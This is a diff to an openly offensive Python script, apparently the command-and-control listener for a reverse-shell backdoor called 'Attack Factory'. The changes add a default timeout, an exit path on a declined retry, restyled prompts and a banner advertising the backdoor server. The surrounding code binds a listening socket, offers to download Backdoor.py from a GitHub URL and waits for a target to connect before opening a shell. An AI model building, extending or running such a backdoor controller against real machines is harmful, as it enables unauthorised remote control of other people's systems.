@@ -96,7 +96,9 @@ def accept_conn():
 	global ip
 	global target
 
-	timeout = input(colored("Set Default timeout for server in Seconds : ",'yellow'))
+	timeout = input(colored("AttackFactory@Default~timeout( Default : 300s )~#$ ",'yellow'))
+	if timeout == "":
+		timeout = 300
 	s.settimeout(int(timeout))
 	try:
 		print(colored("[+] Listening for Incoming connections....",'green'))
@@ -105,6 +107,9 @@ def accept_conn():
 		retry = input(colored('[*] Retry (Y/n) : ','yellow'))
 		if retry == "Y" or retry == "y":
 			accept_conn()
+		else:
+			print(colored("[-] Exiting...",'red'))
+			exit(0)	
 
 def server():
 	global s
@@ -112,7 +117,7 @@ def server():
 	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
 	s.bind(('127.0.0.1',44445))
-	opt = input(colored('[*] Want to Download Backdoor.py (Y/n) : ' ,'yellow'))
+	opt = input(colored('AttackFactory@Download~Backdoor.py(Y/n)~#$ ' ,'yellow'))
 	if opt == "Y" or opt == "y":
 		try:
 			download("https://raw.githubusercontent.com/Bhadresh-Malankiya/BackdoorPy3/main/Backdoor.py")
@@ -127,6 +132,22 @@ def server():
 	print(colored("[+] Target Connected!",'green'))
 			
 def main():
+	banner = '''
+	
+	
+
+	▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄              ▄▄▄  .▄▄ · ▄▄▄ .▄▄▄   ▌ ▐·▄▄▄ .▄▄▄  
+	▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▪     ▪     ▀▄ █·▐█ ▀. ▀▄.▀·▀▄ █·▪█·█▌▀▄.▀·▀▄ █·
+	▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌ ▄█▀▄  ▄█▀▄ ▐▀▀▄ ▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐█▐█•▐▀▀▪▄▐▀▀▄ 
+	██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█▌.▐▌▐█▌.▐▌▐█•█▌▐█▄▪▐█▐█▄▄▌▐█•█▌ ███ ▐█▄▄▌▐█•█▌
+	·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀•  ▀█▄▀▪ ▀█▄▀▪.▀  ▀ ▀▀▀▀  ▀▀▀ .▀  ▀. ▀   ▀▀▀ .▀  ▀
+
+	Attack Factory | Script For Testing Advance Backdoor Server | Reverse Shell
+
+	[!] Advance Backdoor Server Having Multiple Fuctionality 'help' for more after connect
+
+	'''
+	print(colored(banner,'red'))
 	server()
 	shell()
 	s.close()
